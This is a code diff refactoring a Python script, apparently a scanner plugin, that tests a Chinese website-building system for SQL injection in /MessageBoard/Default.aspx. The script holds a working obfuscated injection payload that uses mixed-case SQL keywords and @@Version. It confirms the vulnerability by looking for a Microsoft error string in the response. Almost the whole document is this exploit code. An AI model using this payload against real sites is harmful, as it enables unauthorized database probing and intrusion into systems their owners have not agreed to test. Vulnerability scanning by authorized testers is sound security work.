@@ -9,20 +9,13 @@ description: /MessageBoard/Default.aspx文件Page参数存在SQL注入漏洞,获
 import sys
 import requests
 import warnings
-  
-
-
-class mainone_b2b_Default_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['铭万事业通用建站系统SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/MessageBoard/Default.aspx?hidIsreply=DefaultModule1%24rbIsReply&DefaultModule1%24txtKey=%%27AnD%2B(SeLeCt%20ChAr(64)%2B@@VerSion)>0%20AnD%2B%27%%27=%27"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 500 and r"@Microsoft" in req.text:
@@ -38,5 +31,4 @@ class mainone_b2b_Default_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = mainone_b2b_Default_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
